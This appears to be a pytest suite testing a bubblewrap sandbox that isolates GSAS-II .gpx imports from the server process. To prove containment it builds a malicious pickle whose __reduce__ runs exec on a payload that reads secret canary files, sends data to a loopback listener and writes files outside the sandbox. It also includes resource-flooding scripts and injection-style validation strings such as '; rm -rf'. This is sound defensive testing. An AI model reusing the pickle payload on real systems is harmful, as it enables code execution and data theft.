"""GSAS-II .gpx import through the bubblewrap sandbox.

The server process never unpickles a .gpx: every test here patches pickle in this process to
fail, so a passing import proves the load happened elsewhere. The sandbox's command line is
checked for what it shares (namespaces unshared, home and credentials not mounted, only /work
writable on the host). Without bubblewrap the import refuses and the sandboxed tests skip. A real
refined project reads back when PHASEEVAL_GPX_FIXTURE names one and PHASEEVAL_GSASII_SOURCE names
the GSAS-II source; no project file is kept in this repository.

What a hostile file can cost the importing process is tested without bubblewrap, by standing a
flooding script in for the sandboxed reader: the read stops at the output cap with the parent's
memory still bounded, and the limits the sandbox sets on its processes hold.

Every test writes only under tmp_path: HOME, XDG_CACHE_HOME and TMPDIR point there.
"""

from __future__ import annotations

import hashlib
import json
import os
import pickle
import resource
import secrets
import shutil
import socket
import subprocess
import sys
import tempfile
import time
from collections.abc import Iterator
from dataclasses import dataclass
from pathlib import Path

import pytest
from pydantic import ValidationError

from phaseeval.workbench.importers import gpx_reader, gsasii
from phaseeval.workbench.importers.gsasii import GpxImportError, GpxSandbox, SandboxUnavailable, read_gpx

FIXTURE = Path(os.environ.get("PHASEEVAL_GPX_FIXTURE", "")) if os.environ.get("PHASEEVAL_GPX_FIXTURE") else None
HAS_BWRAP = shutil.which("bwrap") is not None
HAS_GSASII = bool(os.environ.get("PHASEEVAL_GSASII_SOURCE"))
sandboxed = pytest.mark.skipif(not HAS_BWRAP, reason="bubblewrap not installed; see test_no_bubblewrap_refuses")
with_gsasii = pytest.mark.skipif(
    not (HAS_BWRAP and HAS_GSASII), reason="bubblewrap or PHASEEVAL_GSASII_SOURCE missing; the reader needs both"
)
MIB = 2**20


@pytest.fixture(autouse=True)
def only_tmp_path(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[Path]:
    """Nothing here writes outside tmp_path: the home directory, the cache directory and the
    temp directory read_gpx stages the project in all live under it."""
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("XDG_CACHE_HOME", str(home / ".cache"))
    monkeypatch.setenv("TMPDIR", str(tmp_path / "tmp"))
    (tmp_path / "tmp").mkdir()
    monkeypatch.setattr(tempfile, "tempdir", None)  # re-read TMPDIR
    yield home
    monkeypatch.setattr(tempfile, "tempdir", None)


@pytest.fixture
def server_never_unpickles(monkeypatch: pytest.MonkeyPatch) -> None:
    def refuse(*args: object, **kwargs: object) -> None:
        raise AssertionError("a .gpx was unpickled in the server process")

    monkeypatch.setattr(pickle, "load", refuse)
    monkeypatch.setattr(pickle, "loads", refuse)
    monkeypatch.setattr(pickle, "Unpickler", refuse)


@pytest.fixture
def sandbox_env(monkeypatch: pytest.MonkeyPatch) -> None:
    """A GSAS-II source for the sandbox's command line; the tests that read a project need the real one."""
    monkeypatch.setenv("PHASEEVAL_GSASII_SOURCE", os.environ.get("PHASEEVAL_GSASII_SOURCE") or "/usr/share/gsasii")


def _binds(argv: list[str]) -> tuple[list[tuple[str, str]], list[tuple[str, str]]]:
    ro, rw = [], []
    for i, arg in enumerate(argv):
        if arg in ("--ro-bind", "--ro-bind-try"):
            ro.append((argv[i + 1], argv[i + 2]))
        elif arg == "--bind":
            rw.append((argv[i + 1], argv[i + 2]))
    return ro, rw


@sandboxed
def test_the_sandbox_shares_only_the_runtime_the_input_and_one_temp_dir(tmp_path: Path, sandbox_env: None) -> None:
    inbox = tmp_path / "in"
    argv = GpxSandbox.from_environment().argv(inbox)
    for flag in ("--unshare-all", "--as-pid-1", "--clearenv", "--die-with-parent", "--new-session"):
        assert flag in argv  # no network, no bwrap init inside, no inherited environment, no orphaned reader
    ro, rw = _binds(argv)
    assert rw == []  # no host directory is writable; /work is a sized tmpfs
    assert (str(inbox), "/in") in ro
    home = Path.home().resolve()
    private = [home / ".local/state", home / ".ssh", Path.cwd() / "data" / "custody", tmp_path]
    for source, _ in ro:
        src = Path(source).resolve()
        assert src != home, "the home directory is mounted"
        for path in private:
            assert not path.resolve().is_relative_to(src) or src == inbox.resolve(), f"{source} exposes {path}"


@with_gsasii
def test_a_file_that_is_not_a_project_is_refused(tmp_path: Path, server_never_unpickles: None) -> None:
    junk = tmp_path / "junk.gpx"
    junk.write_bytes(b"not a GSAS-II project")
    with pytest.raises(GpxImportError):
        read_gpx(junk)


def test_no_bubblewrap_refuses(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, server_never_unpickles: None, sandbox_env: None) -> None:
    monkeypatch.setattr(gsasii.shutil, "which", lambda name: None)
    project = tmp_path / "project.gpx"
    project.write_bytes(b"any bytes")
    with pytest.raises(SandboxUnavailable):
        read_gpx(project)


def test_without_a_gsasii_source_the_sandbox_is_not_built(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("PHASEEVAL_GSASII_SOURCE", raising=False)
    with pytest.raises(GpxImportError, match="PHASEEVAL_GSASII_SOURCE"):
        GpxSandbox.from_environment().argv(tmp_path / "in")


@pytest.mark.skipif(
    not (HAS_BWRAP and HAS_GSASII and FIXTURE and FIXTURE.is_file()),
    reason="no GSAS-II fixture project on this host (PHASEEVAL_GPX_FIXTURE, PHASEEVAL_GSASII_SOURCE)",
)
def test_a_refined_project_reads_back(server_never_unpickles: None) -> None:
    analysis = read_gpx(FIXTURE)
    assert analysis.saved_using  # the project's own record of what wrote it, apart from this reader
    assert analysis.phases
    for phase in analysis.phases:
        assert phase.space_group
        assert all(phase.cell[k] for k in ("length_a", "length_b", "length_c", "volume"))
        assert not phase.cell_refined or phase.cell_esd.get("length_a")  # s.u. only for a refined cell
    assert analysis.rwp_percent and analysis.gof
    (hist,) = analysis.histograms
    assert hist.x_quantity == "two_theta_deg" and hist.wavelength_angstrom
    n = len(hist.x)
    assert n > 100 and {len(hist.observed), len(hist.calculated), len(hist.background), len(hist.residual)} == {n}
    assert set(hist.mass_fractions) == {p.name for p in analysis.phases}
    derived = [f for f in hist.mass_fractions.values() if f.status == "derived"]
    assert derived and abs(sum(f.value for f in derived) - 1) < 1e-6
    assert len(analysis.source_sha256) == 64


def test_a_fixed_scale_keeps_the_su_its_normalized_fraction_inherits() -> None:
    """Scales .25/.75, only the first varied: the native propagation gives both normalized
    fractions s.u. .075, so the second keeps it."""
    scales = {"0:0:Scale", "1:0:Scale"}
    vary, dependent = {"0:0:Scale"}, set()
    first = gpx_reader.fraction_record(0.25, 0.075, "0:0:Scale", scales, vary, dependent, True)
    second = gpx_reader.fraction_record(0.75, 0.075, "1:0:Scale", scales, vary, dependent, True)
    assert (first["scale_status"], first["su"]) == ("varied", 0.075)
    assert (second["scale_status"], second["su"]) == ("fixed", 0.075)
    constrained = gpx_reader.fraction_record(0.75, 0.075, "1:0:Scale", scales, set(), {"1:0:Scale"}, True)
    assert (constrained["scale_status"], constrained["su"]) == ("dependent", 0.075)
    # every scale fixed: GSAS-II's zero s.u. is not reported as exactness
    frozen = gpx_reader.fraction_record(0.75, 0.0, "1:0:Scale", scales, set(), set(), True)
    assert frozen["su"] is None and frozen["value"] == 0.75
    # no saved covariance: no s.u. at all
    assert gpx_reader.fraction_record(0.75, 0.075, "1:0:Scale", scales, vary, dependent, False)["su"] is None


# --- a hostile .gpx ------------------------------------------------------------------------------
# A crafted .gpx runs code the moment GSAS-II unpickles it. The sandbox is judged by effects outside
# it: a secret planted outside the input is never read back, a loopback listener on the host never
# sees a connection, and no file appears outside the sandbox's temp directory. The identical file
# opened without the sandbox, in a child process, does all three, so the payload is live and the
# containment is what stops it. The payload touches only this test's canaries, listener and targets.

RAN = "phaseeval-hostile-gpx-payload-ran"

# Every probe reports on stderr, which read_gpx folds into its error, then the process exits 3 so
# the report is the last stderr line.
PAYLOAD = """
import os, socket, sys
spec = {spec!r}
read = []
for path in spec["canaries"]:
    try:
        with open(path) as fh:
            read.append(fh.read().strip())
    except OSError:
        pass
try:
    with socket.create_connection(("127.0.0.1", spec["port"]), timeout=3) as conn:
        conn.sendall(b"hello")
except OSError:
    pass
for path in spec["targets"]:
    try:
        with open(path, "w") as fh:
            fh.write("outside")
    except OSError:
        pass
sys.stderr.write({ran!r} + " read=" + ",".join(read) + "\\n")
sys.stderr.flush()
os._exit(3)
"""


class _Hostile:
    def __init__(self, code: str) -> None:
        self.code = code

    def __reduce__(self) -> tuple[object, tuple[str]]:
        return (exec, (self.code,))


@dataclass
class Bait:
    secret: str
    canaries: tuple[Path, ...]
    targets: tuple[Path, ...]
    listener: socket.socket
    gpx: Path

    def connected(self) -> bool:
        try:
            conn, _ = self.listener.accept()
        except TimeoutError:
            return False
        conn.close()
        return True


@pytest.fixture
def bait(tmp_path: Path, only_tmp_path: Path) -> Iterator[Bait]:
    """Canaries in the test's tmp dir, beside the input and under $HOME (itself under tmp_path);
    write targets in the same three places; a listener on the host's loopback."""
    secret, tag = secrets.token_hex(16), secrets.token_hex(6)
    source, cache = tmp_path / "source", only_tmp_path / ".cache"
    assert Path.home() == only_tmp_path
    source.mkdir()
    cache.mkdir()
    canaries = (tmp_path / "canary.txt", source / "canary.txt", cache / f"phaseeval-gpx-canary-{tag}.txt")
    targets = (tmp_path / "escaped.txt", source / "escaped.txt", cache / f"phaseeval-gpx-escaped-{tag}.txt")
    listener = socket.create_server(("127.0.0.1", 0))
    listener.settimeout(2)
    try:
        for canary in canaries:
            canary.write_text(secret)
        spec = {
            "canaries": [str(c) for c in canaries],
            "port": listener.getsockname()[1],
            "targets": [str(t) for t in targets],
        }
        gpx = source / "project.gpx"
        gpx.write_bytes(pickle.dumps(_Hostile(PAYLOAD.format(spec=spec, ran=RAN)), protocol=2))
        yield Bait(secret, canaries, targets, listener, gpx)
    finally:
        listener.close()
        for path in (*canaries, *targets):
            path.unlink(missing_ok=True)


@sandboxed
def test_unsandboxed_the_hostile_payload_reads_connects_and_writes(bait: Bait) -> None:
    """The positive control: without the sandbox the payload reaches every canary, the listener and
    every target, so the sandboxed test below cannot pass because the payload is inert."""
    run = subprocess.run(
        [sys.executable, "-I", "-c", "import pickle, sys; pickle.load(open(sys.argv[1], 'rb'))", str(bait.gpx)],
        capture_output=True, timeout=60, cwd=bait.gpx.parent, check=False,
    )
    report = run.stderr.decode("utf-8", "replace")
    assert run.returncode == 3 and RAN in report
    assert report.count(bait.secret) == len(bait.canaries)
    assert bait.connected()
    assert all(target.read_text() == "outside" for target in bait.targets)


@with_gsasii
def test_in_the_sandbox_the_hostile_payload_reads_connects_and_writes_nothing(
    bait: Bait, server_never_unpickles: None
) -> None:
    with pytest.raises(GpxImportError) as refused:
        read_gpx(bait.gpx)
    message = str(refused.value)
    assert "(exit 3)" in message and message.rstrip().endswith(f"{RAN} read=")  # it ran, in there
    assert bait.secret not in message
    assert not bait.connected()
    assert not any(target.exists() for target in bait.targets)


# --- what a hostile file can learn about the host ---------------------------------------------------
# A project that owns the reader's process reads what /proc and the environment show. The sandbox
# is judged from inside, by a reader that scrapes them for the importer's canary and copies what it
# finds into its output; and from outside, by the bounds every string of that output must pass.

CANARY_VAR = "PHASEEVAL_TEST_CANARY"
HOSTILE_READER = Path(__file__).resolve().parent / "fixtures" / "exfiltrating_reader.py"
CASE_DIR = Path(__file__).resolve().parents[2] / "harness/examples/dev006/input"


@pytest.fixture
def canary(monkeypatch: pytest.MonkeyPatch) -> str:
    """The importer's own environment holds a secret while it imports."""
    secret = f"secret-{secrets.token_hex(12)}"
    monkeypatch.setenv(CANARY_VAR, secret)
    return secret


@pytest.fixture
def hostile_reader(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """The exfiltrating reader in place of gpx_reader.py, under the real bwrap, and a project
    file it can turn into an analysis of the DEV006 case."""
    (tmp_path / "gsasii").mkdir()
    monkeypatch.setenv("PHASEEVAL_GSASII_SOURCE", str(tmp_path / "gsasii"))
    monkeypatch.setattr(gsasii, "READER", HOSTILE_READER)
    rows = [line.split() for line in (CASE_DIR / "DEV006.xy").read_text().splitlines() if line.strip()][500:2500]
    project = tmp_path / "project.gpx"
    project.write_text(json.dumps({
        "x": [float(r[0]) for r in rows], "observed": [float(r[1]) for r in rows],
        "names": ["cod_1010093", "cod_9008283"], "fractions": [0.6, 0.4],
    }))
    return project


@sandboxed
def test_in_the_sandbox_the_importers_environment_is_not_readable(
    canary: str, hostile_reader: Path, server_never_unpickles: None
) -> None:
    """Inside, the reader is the only process and no /proc/*/environ or cmdline holds the
    importer's variables; its output, which copies all it read, carries no canary."""
    analysis = read_gpx(hostile_reader)
    report = analysis.histograms[0].fraction_basis
    assert report.startswith("pids=[1] canary_found=False"), report
    assert canary not in analysis.model_dump_json()
    assert analysis.saved_using == "GSAS-II 5837"
    # Every environment it read is the reader's own (--clearenv and --setenv), and PID 1's command
    # line is the reader's, not bwrap's with the host's mounts.
    assert CANARY_VAR not in report and "HOME=/work PATH=/usr/bin:/bin" in report, report
    assert "/proc/1/cmdline: " in report and "--ro-bind" not in report, report


def test_the_sandbox_process_starts_with_an_empty_environment(
    tmp_path: Path, canary: str, server_never_unpickles: None
) -> None:
    """The process read_gpx starts inherits none of this process's environment, bwrap or not."""
    seen = tmp_path / "environ.json"
    sandbox, project, _ = _stub(tmp_path, "import json\nopen(sys.argv[2], 'w').write(json.dumps(dict(os.environ)))\nos._exit(0)", extra=str(seen))
    with pytest.raises(GpxImportError):  # no JSON on stdout
        read_gpx(project, sandbox)
    environ = json.loads(seen.read_text())
    assert canary not in json.dumps(environ)
    assert not {CANARY_VAR, "HOME", "PATH"} & set(environ), environ


def _analysis_payload(**fields: object) -> dict[str, object]:
    histogram = {
        "name": "PWDR DEV006.xy", "instrument_type": "PXC", "x_quantity": "two_theta_deg", "wavelength_angstrom": 1.5406,
        "wr_percent": 7.25, "x": [10.0, 10.1], "observed": [1.0, 2.0], "calculated": [1.0, 2.0], "background": [0.0, 0.0],
        "residual": [0.0, 0.0], "fraction_basis": "test", "le_bail_phases": [],
        "mass_fractions": {"NiO": {"status": "derived", "scale_status": "varied", "value": 1.0, "su": 0.01, "detail": ""}},
    }
    phase = {"name": "NiO", "space_group": "F m -3 m", "cell": {"length_a": 4.17}, "cell_refined": False, "cell_esd": {}, "pawley": False}
    payload = {
        "source_sha256": "a" * 64, "saved_using": "GSAS-II 5837", "reader_gsasii_version": "5.4.1+g1a2b3c (2025-03-01)",
        "rwp_percent": 7.25, "gof": 2.1, "converged": True, "phases": [phase], "histograms": [histogram],
    }
    for key, value in fields.items():
        target, _, leaf = key.rpartition("__")
        {"phase": phase, "histogram": histogram, "": payload}[target][leaf] = value
    return payload


def test_a_valid_analysis_passes_the_string_bounds() -> None:
    analysis = gsasii.GpxAnalysis.model_validate(_analysis_payload())
    assert analysis.saved_using == "GSAS-II 5837" and analysis.phases[0].space_group == "F m -3 m"


@pytest.mark.parametrize(
    "field, value",
    [
        ("saved_using", "/home/alice/.cache/token"),  # a path
        ("saved_using", "HF_TOKEN=hf_abc"),  # an environment line
        ("saved_using", "x" * 65),  # too long for a version
        ("saved_using", ""),
        ("reader_gsasii_version", "5837\n"),
        ("phase__name", "NiO\x00"),  # a control character
        ("phase__name", "n" * 201),
        ("phase__space_group", "F m -3 m; rm -rf"),
        ("phase__cell", {"HF_TOKEN": 1.0}),  # a cell key that is not a cell key
        ("histogram__name", "PWDR\x1b[31m"),
        ("histogram__instrument_type", "PXC/home"),
        ("histogram__fraction_basis", "b" * 2001),
        ("histogram__le_bail_phases", ["NiO\n"]),
    ],
)
def test_a_string_past_its_bound_refuses_the_analysis(field: str, value: object) -> None:
    with pytest.raises(ValidationError):
        gsasii.GpxAnalysis.model_validate(_analysis_payload(**{field: value}))


def test_a_fraction_detail_past_its_bound_refuses_the_analysis() -> None:
    payload = _analysis_payload()
    payload["histograms"][0]["mass_fractions"]["NiO"]["detail"] = "d" * 501  # type: ignore[index]
    with pytest.raises(ValidationError):
        gsasii.GpxAnalysis.model_validate(payload)
    payload["histograms"][0]["mass_fractions"]["NiO"]["detail"] = "KeyError: 'x'\n"  # type: ignore[index]
    with pytest.raises(ValidationError):
        gsasii.GpxAnalysis.model_validate(payload)


# --- what a hostile file can cost the importing process -------------------------------------------
# Without bubblewrap, a script stands in for the sandboxed reader so the read loop and the limits
# are driven for real on any host: the sandbox command line is replaced, nothing else is.

STUB = """
import os, sys, time
open(sys.argv[1], "w").write(str(os.getpid()))
{body}
"""
FLOOD = "chunk = b'x' * (1 << 20)\nfor _ in range(600): os.write({fd}, chunk)\ntime.sleep(600)"
BIG_FILE = "with open(sys.argv[2], 'wb') as fh:\n    for _ in range(300): fh.write(b'z' * (1 << 20))\nos._exit(4)"
ALLOCATE = "try:\n    held = bytearray(2 << 30)\nexcept MemoryError:\n    os._exit(7)\nos._exit(0)"
WELL_BEHAVED = "sys.stderr.write('GSAS-II console noise\\n')\nsys.stdout.write(sys.argv[2])\nsys.stdout.flush()\nos._exit(0)"


@dataclass(frozen=True)
class _StubSandbox(GpxSandbox):
    """The same limits and read loop, with a script in place of bwrap and the reader."""

    body: str = ""
    pid_file: str = ""
    extra: str = ""

    def argv(self, inbox: Path) -> list[str]:
        return [sys.executable, "-I", "-c", STUB.format(body=self.body), self.pid_file, self.extra]


def _rss_bytes() -> int:
    peak = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    return peak if sys.platform == "darwin" else peak * 1024


def _stub(tmp_path: Path, body: str, extra: str = "", **limits: object) -> tuple[_StubSandbox, Path, Path]:
    pid_file = tmp_path / "reader.pid"
    project = tmp_path / "project.gpx"
    project.write_bytes(b"never unpickled here")
    sandbox = _StubSandbox(
        python=Path(sys.executable), gsasii_source=tmp_path, timeout_s=float(limits.pop("timeout_s", 60.0)),  # type: ignore[arg-type]
        body=body, pid_file=str(pid_file), extra=extra, **limits,  # type: ignore[arg-type]
    )
    return sandbox, project, pid_file


def _gone(pid_file: Path) -> bool:
    pid = int(pid_file.read_text())
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return True
    return False


@pytest.mark.parametrize("stream", ["stdout", "stderr"])
def test_a_reader_that_floods_an_output_stream_is_killed_at_the_cap(
    tmp_path: Path, stream: str, server_never_unpickles: None
) -> None:
    """600 MB written to one stream: the read stops at 8 MiB, the stub (which would otherwise
    sleep for ten minutes) is gone at once, and this process has not held the flood."""
    fd = 1 if stream == "stdout" else 2
    sandbox, project, pid_file = _stub(
        tmp_path, FLOOD.format(fd=fd), max_output_bytes=8 * MIB, max_stderr_bytes=8 * MIB
    )
    before, started = _rss_bytes(), time.monotonic()
    with pytest.raises(GpxImportError, match=f"more than {8 * MIB} bytes to {stream}"):
        read_gpx(project, sandbox)
    elapsed, grown = time.monotonic() - started, _rss_bytes() - before
    assert elapsed < 20, f"the flood ran {elapsed:.1f} s; the cap did not stop it"
    assert grown < 64 * MIB, f"this process grew {grown / MIB:.0f} MiB holding the flood"
    assert _gone(pid_file)


HANG = "time.sleep(600)"
CLOSE_AND_HANG = "os.close(1)\nos.close(2)\ntime.sleep(600)"


@pytest.mark.parametrize("body", [HANG, CLOSE_AND_HANG], ids=["hangs", "closes_its_pipes_then_hangs"])
def test_a_reader_that_hangs_is_killed_at_the_deadline(tmp_path: Path, body: str, server_never_unpickles: None) -> None:
    """Both deadline branches. A reader that keeps its pipes open and never finishes is killed
    when the read loop passes the deadline; one that closes them first, so the loop ends, is
    killed when the wait for its exit does. Either way the stub, which would otherwise sleep for
    ten minutes, is gone at once."""
    sandbox, project, pid_file = _stub(tmp_path, body, timeout_s=3.0)
    started = time.monotonic()
    with pytest.raises(GpxImportError, match="did not finish in 3 s"):
        read_gpx(project, sandbox)
    elapsed = time.monotonic() - started
    assert 3.0 <= elapsed < 15, f"the deadline fired after {elapsed:.1f} s"
    assert _gone(pid_file)


def test_a_reader_cannot_write_a_file_past_the_limit(tmp_path: Path, server_never_unpickles: None) -> None:
    """RLIMIT_FSIZE holds inside: a 300 MB write is cut at 8 MiB and the reader dies for it."""
    target = tmp_path / "big"
    sandbox, project, _ = _stub(tmp_path, BIG_FILE, extra=str(target), max_file_bytes=8 * MIB)
    with pytest.raises(GpxImportError, match=r"could not be read \(exit"):
        read_gpx(project, sandbox)
    assert target.stat().st_size <= 8 * MIB


@pytest.mark.skipif(sys.platform != "linux", reason="RLIMIT_AS is enforced on Linux, where the sandbox runs")
def test_a_reader_cannot_allocate_past_the_memory_limit(tmp_path: Path, server_never_unpickles: None) -> None:
    sandbox, project, _ = _stub(tmp_path, ALLOCATE, max_memory_bytes=1 << 30)
    with pytest.raises(GpxImportError, match=r"\(exit 7\)"):
        read_gpx(project, sandbox)


def test_the_limits_are_set_by_the_child_and_the_sandbox_is_started_only_by_the_cli() -> None:
    """No preexec_fn: the child sets its own hard limits and execs the command, so nothing runs
    in this process between fork and exec and a threaded caller would be safe. Today's only
    caller is the single-threaded CLI; no module of the API or the rest of the workbench calls
    read_gpx, so the server never starts the sandbox."""
    source = Path(gsasii.__file__).read_text()
    assert "preexec_fn=" not in source  # Popen is never given one
    assert "RLIMIT_FSIZE" in source and "RLIMIT_AS" in source and "os.execv" in source
    src = Path(gsasii.__file__).resolve().parents[3]
    callers = sorted(
        p.relative_to(src).as_posix()
        for p in src.rglob("*.py")
        if "read_gpx(" in p.read_text() and p.resolve() != Path(gsasii.__file__).resolve()
    )
    assert callers == ["phaseeval/workbench/cli.py"], callers


def test_a_reader_under_the_caps_is_read_whole(tmp_path: Path, server_never_unpickles: None) -> None:
    """The bounded loop keeps every byte of an ordinary read: the stub's JSON validates into the
    analysis, with the digest taken from the file here, not from the reader."""
    payload = {
        "saved_using": "GSAS-II 5837", "reader_gsasii_version": "5837", "rwp_percent": 5.5, "gof": 1.2,
        "converged": True, "phases": [], "histograms": [],
    }
    sandbox, project, _ = _stub(tmp_path, WELL_BEHAVED, extra=json.dumps(payload))
    analysis = read_gpx(project, sandbox)
    assert analysis.rwp_percent == 5.5 and analysis.saved_using == "GSAS-II 5837"
    assert analysis.source_sha256 == hashlib.sha256(project.read_bytes()).hexdigest()


def _fake_bwrap(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, options: str) -> None:
    """A bwrap whose --help lists `options`, found by shutil.which."""
    fake = tmp_path / "bwrap"
    fake.write_text(f"#!/bin/sh\necho '{options}'\n")
    fake.chmod(0o755)
    monkeypatch.setattr(gsasii.shutil, "which", lambda name: str(fake))
    gsasii._bwrap_options.cache_clear()


def test_every_writable_mount_of_the_sandbox_is_a_sized_tmpfs(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, sandbox_env: None) -> None:
    """/work, /tmp and /dev/shm are each a tmpfs with --size, no host directory is bound
    writable, and the root and /dev are remounted read-only after setup."""
    _fake_bwrap(tmp_path, monkeypatch, "  --size BYTES  Set size of next argument (only for --tmpfs)\n  --as-pid-1  Do not install a reaper process with PID=1")
    sandbox = GpxSandbox.from_environment()
    monkeypatch.setattr(GpxSandbox, "runtime_paths", lambda self: (tmp_path / "runtime",))
    argv = sandbox.argv(tmp_path / "in")
    tmpfs = [argv[i + 1] for i, a in enumerate(argv) if a == "--tmpfs"]
    assert tmpfs == ["/dev/shm", "/tmp", "/work"]
    assert all(argv[i - 2 : i] == ["--size", str(sandbox.max_tmpfs_bytes)] for i, a in enumerate(argv) if a == "--tmpfs")
    assert [argv[i + 1] for i, a in enumerate(argv) if a == "--remount-ro"] == ["/dev", "/"]
    assert _binds(argv)[1] == [] and "--bind" not in argv
    gsasii._bwrap_options.cache_clear()


def test_a_bubblewrap_that_cannot_size_a_tmpfs_is_refused(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, sandbox_env: None) -> None:
    """Before 0.5.0 bwrap has no --size, which would leave every writable mount unbounded: the
    import refuses rather than run with the caps silently dropped."""
    _fake_bwrap(tmp_path, monkeypatch, "  --as-pid-1  Do not install a reaper process with PID=1\n  --tmpfs DEST  Mount new tmpfs on DEST")
    with pytest.raises(SandboxUnavailable, match="lacks --size; 0.5.0 or later"):
        GpxSandbox.from_environment().argv(tmp_path / "in")
    gsasii._bwrap_options.cache_clear()


FILLER = """
import json, os, sys
written = {}
for name, mount in (("work", "/work"), ("tmp", "/tmp"), ("shm", "/dev/shm")):
    written[name] = 0
    try:
        for i in range(64):  # 64 files of 8 MiB: 512 MiB if nothing stops it
            with open(f"{mount}/fill{i}", "wb") as fh:
                fh.write(b"z" * (8 << 20))
            written[name] += 8 << 20
    except OSError:
        pass
sys.stdout.write(json.dumps({
    "saved_using": " ".join(f"{k}:{v}" for k, v in written.items()), "reader_gsasii_version": None,
    "rwp_percent": None, "gof": None, "converged": None, "phases": [], "histograms": [],
}))
"""


@sandboxed
def test_the_sandboxs_writable_space_is_bounded_in_total(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, server_never_unpickles: None) -> None:
    """Under bwrap, a reader that fills every writable mount with many files under the per-file
    limit stops at each tmpfs's size: the total it can write is three sized tmpfs, and no host
    directory receives any of it."""
    (tmp_path / "gsasii").mkdir()
    filler = tmp_path / "filler.py"
    filler.write_text(FILLER)
    monkeypatch.setattr(gsasii, "READER", filler)
    sandbox = GpxSandbox(python=Path(sys.executable), gsasii_source=tmp_path / "gsasii", max_tmpfs_bytes=32 * MIB, timeout_s=120.0)
    project = tmp_path / "project.gpx"
    project.write_bytes(b"never unpickled here")
    analysis = read_gpx(project, sandbox)
    written = {k: int(v) for k, v in (part.split(":") for part in analysis.saved_using.split())}
    assert set(written) == {"work", "tmp", "shm"}
    for name, total in written.items():
        assert 16 * MIB <= total <= 32 * MIB, f"{name}: {total} bytes written against a {32 * MIB} byte tmpfs"
    assert not list((tmp_path / "tmp").iterdir())  # read_gpx's scratch directory is gone, and held no /work
